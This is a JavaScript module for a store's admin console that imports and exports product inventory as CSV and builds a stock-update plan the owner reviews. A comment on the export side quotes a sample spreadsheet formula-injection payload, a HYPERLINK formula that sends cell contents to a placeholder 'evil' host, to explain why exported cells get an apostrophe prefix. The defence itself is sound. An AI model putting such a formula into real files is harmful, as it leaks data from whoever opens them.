/**
 * CSV inventory bridge for the admin console.
 *
 * The owner restocks from spreadsheets and from lists an assistant like ChatGPT
 * writes out, so the parser is deliberately forgiving: markdown fences, stray
 * bullet characters, currency symbols, thousands separators and a dozen spellings
 * of "quantity" all resolve to the same canonical product shape.
 */

export const CANONICAL_FIELDS = [
  "barcode",
  "name",
  "cat",
  "distributor",
  "qty",
  "price",
  "originalPrice",
  "unit",
  "brand",
  "badge",
  "img",
];

/* Every header spelling we have actually seen, lowercased and stripped of
   punctuation, pointing at the field it fills. */
const HEADER_ALIASES = {
  barcode: "barcode",
  sku: "barcode",
  id: "barcode",
  productid: "barcode",
  itemcode: "barcode",
  code: "barcode",
  ean: "barcode",

  name: "name",
  item: "name",
  itemname: "name",
  product: "name",
  productname: "name",
  title: "name",
  description: "name",

  qty: "qty",
  quantity: "qty",
  amount: "qty",
  stock: "qty",
  stockqty: "qty",
  units: "qty",
  count: "qty",
  pieces: "qty",
  pcs: "qty",
  instock: "qty",
  openingstock: "qty",

  price: "price",
  sellingprice: "price",
  saleprice: "price",
  rate: "price",
  ourprice: "price",
  dashitprice: "price",
  unitprice: "price",

  originalprice: "originalPrice",
  mrp: "originalPrice",
  maximumretailprice: "originalPrice",
  listprice: "originalPrice",
  strikeprice: "originalPrice",

  unit: "unit",
  size: "unit",
  weight: "unit",
  packsize: "unit",
  packaging: "unit",
  volume: "unit",

  cat: "cat",
  category: "cat",
  department: "cat",
  section: "cat",
  aisle: "cat",

  brand: "brand",
  company: "brand",
  manufacturer: "brand",

  distributor: "distributor",
  distributer: "distributor",
  supplier: "distributor",
  vendor: "distributor",
  wholesaler: "distributor",
  dealer: "distributor",
  source: "distributor",
  agency: "distributor",

  badge: "badge",
  tag: "badge",
  label: "badge",

  img: "img",
  image: "img",
  imageurl: "img",
  photo: "img",
  picture: "img",
};

const normaliseHeader = (h) =>
  String(h || "")
    .replace(/﻿/g, "")
    .toLowerCase()
    .replace(/\(.*?\)/g, "")
    .replace(/[^a-z0-9]/g, "")
    .trim();

const DELIMITERS = [",", ";", "\t", "|"];

/** How many cells on this line are column names we recognise. */
function headerScore(line) {
  let best = 0;
  for (const d of DELIMITERS) {
    const cells = line.split(d);
    if (cells.length < 2) continue;
    const known = cells.filter((c) => HEADER_ALIASES[normaliseHeader(c)]).length;
    if (known > best) best = known;
  }
  return best;
}

/**
 * Strip the wrappers an LLM puts around CSV before the rows begin: ```csv fences,
 * a leading "Here is your CSV:" line, markdown bullets and a UTF-8 BOM.
 *
 * The header is located by recognising column names rather than by looking for
 * the first line containing a comma. A conversational lead-in like
 * "Sure, here is your restock list:" contains a comma too, and treating it as
 * the header silently turned every real column into a data row.
 */
export function stripLlmWrapping(raw) {
  let text = String(raw || "").replace(/^\ufeff/, "");

  const fence = text.match(/```(?:csv|CSV|text)?\s*\n([\s\S]*?)```/);
  if (fence) text = fence[1];

  const lines = text.split(/\r\n|\n|\r/);
  const cleaned = lines.map((line) => line.replace(/^\s*[-*\u2022]\s+/, "").trimEnd());

  /* Prefer the best-scoring line in the first stretch of the file: the real
     header matches several known aliases, prose matches none. */
  let firstRow = -1;
  let bestScore = 1;
  const horizon = Math.min(cleaned.length, 25);
  for (let i = 0; i < horizon; i += 1) {
    const score = headerScore(cleaned[i]);
    if (score > bestScore) {
      bestScore = score;
      firstRow = i;
    }
  }

  /* Nothing recognisable — fall back to the first line that at least looks
     delimited, so an unusual but valid file is still parsed. */
  if (firstRow === -1) {
    firstRow = 0;
    while (
      firstRow < cleaned.length &&
      (!cleaned[firstRow].trim() || !/[,;\t|]/.test(cleaned[firstRow]))
    ) {
      firstRow += 1;
    }
    if (firstRow >= cleaned.length) firstRow = 0;
  }

  return cleaned.slice(firstRow).join("\n").trim();
}

/** Pick the delimiter that appears most consistently in the header line. */
function detectDelimiter(headerLine) {
  const candidates = DELIMITERS;
  let best = ",";
  let bestCount = 0;
  candidates.forEach((d) => {
    const count = headerLine.split(d).length - 1;
    if (count > bestCount) {
      best = d;
      bestCount = count;
    }
  });
  return best;
}

/**
 * RFC 4180 parser — handles quoted fields, escaped quotes ("") and newlines
 * inside quotes, which naive split(",") calls get wrong on product descriptions.
 */
export function parseCsv(raw) {
  const text = stripLlmWrapping(raw);
  if (!text) return [];

  const headerLine = text.split(/\n/)[0] || "";
  const delimiter = detectDelimiter(headerLine);

  const rows = [];
  let row = [];
  let field = "";
  let inQuotes = false;

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];

    if (inQuotes) {
      if (char === '"') {
        if (text[i + 1] === '"') {
          field += '"';
          i += 1;
        } else {
          inQuotes = false;
        }
      } else {
        field += char;
      }
      continue;
    }

    if (char === '"') {
      inQuotes = true;
    } else if (char === delimiter) {
      row.push(field);
      field = "";
    } else if (char === "\n" || char === "\r") {
      if (char === "\r" && text[i + 1] === "\n") i += 1;
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
    } else {
      field += char;
    }
  }
  row.push(field);
  rows.push(row);

  return rows.filter((r) => r.some((c) => String(c).trim() !== ""));
}

/** "₹1,299.50" / "Rs. 90" / "90/-" all become 90-ish numbers; junk becomes null. */
export function parseAmount(value) {
  if (value === null || value === undefined) return null;

  const stripped = String(value)
    .replace(/[₹$]|rs\.?|inr/gi, "")
    .replace(/,(?=\d{3}\b)/g, "")
    .replace(/\/-\s*$/, "")
    .trim();

  /* Stripping every non-digit used to fuse separated numbers into one: a pack
     line reading "10 x 500ml" became 10500, a thousand-fold overstock that
     still looks plausible in the preview. A cell must contain exactly one
     numeric group to be trusted; anything else is reported as unreadable. */
  const groups = stripped.match(/-?\d+(?:\.\d+)?/g);
  if (!groups || groups.length !== 1) return null;

  const num = Number(groups[0]);
  return Number.isFinite(num) ? num : null;
}

/** Map the file's header row onto canonical fields. */
export function mapHeaders(headerCells) {
  return headerCells.map((cell) => HEADER_ALIASES[normaliseHeader(cell)] || null);
}

/* djb2 over the full name. The slug is truncated for readability, and two
   pack-size variants of one brand routinely share their first 40 characters —
   without this suffix they collided on a single document id and the second
   import silently overwrote the first. */
const nameHash = (name) => {
  let h = 5381;
  for (let i = 0; i < name.length; i += 1) h = ((h << 5) + h + name.charCodeAt(i)) >>> 0;
  return h.toString(36);
};

const slugId = (name) => {
  const full = String(name).trim();
  const slug = full
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-|-$/g, "")
    .slice(0, 40)
    .replace(/-$/, "");
  return `CSV-${slug}-${nameHash(full.toLowerCase())}`;
};

/**
 * Turn parsed CSV rows into a reviewable plan. Nothing is written here — the
 * owner confirms the plan first, which is the whole point of the preview screen.
 *
 * @param stockMode "add" increments existing stock, "set" overwrites it.
 */
export function buildImportPlan(raw, existingProducts = [], stockMode = "add", defaultDistributor = "") {
  const rows = parseCsv(raw);
  if (rows.length === 0) {
    return { items: [], errors: [], unmappedHeaders: [], missingColumns: ["name"], headerFields: [], stockMode };
  }

  const headerFields = mapHeaders(rows[0]);
  const unmappedHeaders = rows[0]
    .map((cell, i) => (headerFields[i] ? null : String(cell).trim()))
    .filter(Boolean);

  const missingColumns = [];
  if (!headerFields.includes("name") && !headerFields.includes("barcode")) missingColumns.push("name");
  if (!headerFields.includes("qty")) missingColumns.push("quantity");

  const byId = new Map();
  const byName = new Map();
  existingProducts.forEach((p) => {
    const id = String(p.id || p.barcode || "");
    if (id) byId.set(id.toLowerCase(), p);
    if (p.name) byName.set(String(p.name).trim().toLowerCase(), p);
  });

  const items = [];
  const errors = [];
  /* Resolved id -> index in `items`. Two rows naming the same product used to
     produce two independent absolute writes, and the second silently undid the
     first (24 +40 then +30 landed on 54, not 94). They are merged into one
     reviewable line instead. */
  const seen = new Map();

  for (let r = 1; r < rows.length; r += 1) {
    const cells = rows[r];
    const rowNo = r + 1;
    const record = {};
    headerFields.forEach((field, i) => {
      if (!field) return;
      const value = String(cells[i] === undefined ? "" : cells[i]).trim();
      if (value !== "") record[field] = value;
    });

    const name = (record.name || "").trim();
    const barcode = (record.barcode || "").trim();

    if (!name && !barcode) {
      errors.push({ row: rowNo, reason: "No product name or barcode in this row." });
      continue;
    }

    const qty = parseAmount(record.qty);
    if (qty === null) {
      errors.push({ row: rowNo, reason: `"${name || barcode}" has no readable quantity.` });
      continue;
    }
    if (qty < 0) {
      errors.push({ row: rowNo, reason: `"${name || barcode}" has a negative quantity (${qty}).` });
      continue;
    }

    const match =
      (barcode && byId.get(barcode.toLowerCase())) ||
      (name && byName.get(name.toLowerCase())) ||
      null;

    const assignedDistributor = record.distributor || defaultDistributor || (match ? match.distributor : "");

    const price = parseAmount(record.price);
    const originalPrice = parseAmount(record.originalPrice);
    const currentStock = match ? Number(match.stock) || 0 : 0;
    const newStock = match && stockMode === "add" ? currentStock + qty : qty;

    /* Price, category, and distributor changes on an existing item are surfaced
       separately so the owner can verify before landing. */
    const changes = [];
    if (match) {
      if (price !== null && Number(match.price) !== price) {
        changes.push(`Price ₹${match.price} → ₹${price}`);
      }
      if (originalPrice !== null && Number(match.originalPrice) !== originalPrice) {
        changes.push(`MRP ₹${match.originalPrice || "—"} → ₹${originalPrice}`);
      }
      if (record.cat && match.cat && record.cat !== match.cat) {
        changes.push(`Category ${match.cat} → ${record.cat}`);
      }
      if (assignedDistributor && match.distributor && assignedDistributor !== match.distributor) {
        changes.push(`Distributor ${match.distributor} → ${assignedDistributor}`);
      }
    }

    const rowErrors = [];
    if (!match && price === null) {
      rowErrors.push("New item needs a price.");
    }

    const resolvedId = match ? String(match.id || match.barcode) : barcode || slugId(name);

    const dupIndex = seen.get(resolvedId);
    if (dupIndex !== undefined) {
      const first = items[dupIndex];
      /* "add" accumulates the repeats; "set" is an absolute count, so the last
         row wins, matching what the owner would expect from a stock correction. */
      first.qty = stockMode === "add" ? first.qty + qty : qty;
      first.newStock = stockMode === "add" ? first.currentStock + first.qty : first.qty;
      first.mergedRows = [...(first.mergedRows || [first.row]), rowNo];
      continue;
    }

    seen.set(resolvedId, items.length);

    items.push({
      row: rowNo,
      action: match ? "restock" : "new",
      include: rowErrors.length === 0,
      blocked: rowErrors.length > 0,
      blockReason: rowErrors.join(" "),
      id: resolvedId,
      name: name || (match ? match.name : barcode),
      cat: record.cat || (match ? match.cat : "Grocery"),
      distributor: assignedDistributor || "",
      unit: record.unit || (match ? match.unit : "1 pc"),
      brand: record.brand || (match ? match.brand : ""),
      badge: record.badge || (match ? match.badge : "Fresh"),
      img: record.img || (match ? match.img : ""),
      price: price !== null ? price : match ? Number(match.price) || 0 : 0,
      originalPrice:
        originalPrice !== null
          ? originalPrice
          : match
          ? Number(match.originalPrice) || 0
          : price || 0,
      qty,
      currentStock,
      newStock,
      changes,
    });
  }

  return { items, errors, unmappedHeaders, missingColumns, headerFields, stockMode };
}

/**
 * Convert an approved plan into the shape bulkUpdateProductStock expects.
 *
 * In "add" mode the delta is sent as `qtyToAdd`, which db.js applies inside a
 * runTransaction against the server's current value. Sending the precomputed
 * absolute `newStock` instead meant any stock movement between building the
 * preview and pressing Confirm — an order shipping and deducting inventory,
 * say — was silently overwritten. "set" is an explicit absolute count, so it
 * still writes `newStock`.
 */
export function planToStockUpdates(items, stockMode = "add", defaultDistributor = "") {
  return items
    .filter((i) => i.include && !i.blocked)
    .map((item) => ({
      id: item.id,
      barcode: item.id,
      ...(stockMode === "add" ? { qtyToAdd: item.qty } : { newStock: item.newStock }),
      product: {
        id: item.id,
        barcode: item.id,
        name: item.name,
        cat: item.cat,
        distributor: item.distributor || defaultDistributor || undefined,
        unit: item.unit,
        brand: item.brand || undefined,
        badge: item.badge || undefined,
        img: item.img || undefined,
        price: item.price,
        originalPrice: item.originalPrice || item.price,
      },
    }));
}

/* A cell beginning =, +, -, @, tab or CR is executed as a formula by Excel,
   LibreOffice and Sheets when the file is opened. Product names come from the
   catalogue, which an import can populate, so a name like
   `=HYPERLINK("http://evil/?d="&A1,"x")` would run on the owner's machine and
   leak neighbouring cells. Quoting alone does not stop it — the spreadsheet
   strips CSV quoting before evaluating — so the value is prefixed with an
   apostrophe, which forces it to be read as text. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

const csvCell = (value) => {
  let str = value === null || value === undefined ? "" : String(value);
  if (FORMULA_LEAD.test(str)) str = `'${str}`;
  return /[",\n\r]/.test(str) ? `"${str.replace(/"/g, '""')}"` : str;
};

export const EXPORT_COLUMNS = [
  ["barcode", (p) => p.id || p.barcode],
  ["name", (p) => p.name],
  ["category", (p) => p.cat],
  ["distributor", (p) => p.distributor || ""],
  ["quantity", (p) => (p.stock === undefined || p.stock === null ? 0 : p.stock)],
  ["price", (p) => p.price],
  ["mrp", (p) => p.originalPrice || p.price],
  ["unit", (p) => p.unit],
  ["brand", (p) => p.brand || ""],
  ["badge", (p) => p.badge || ""],
  ["image", (p) => p.img || ""],
];

export function productsToCsv(products = []) {
  const header = EXPORT_COLUMNS.map(([label]) => label).join(",");
  const body = products
    .map((p) => EXPORT_COLUMNS.map(([, get]) => csvCell(get(p))).join(","))
    .join("\n");
  return `${header}\n${body}\n`;
}

export const CSV_TEMPLATE = `barcode,name,category,distributor,quantity,price,mrp,unit,brand,badge,image
,Fresh Onion,Vegetables,Anantnag Fresh Farm Orchards,40,35,45,1 kg,Local Farm,Daily Staple,
,Amul Gold Full Cream Milk,Dairy,Amul Valley Dairy Logistics,60,36,38,500 ml,Amul,Full Cream,
,Vim Dishwash Gel Lemon,Kitchen Care,Hindustan Unilever Direct,25,115,130,500 ml,Vim,Bestseller,
`;

export function downloadCsv(filename, contents) {
  if (typeof window === "undefined") return;
  const blob = new Blob([contents], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
}
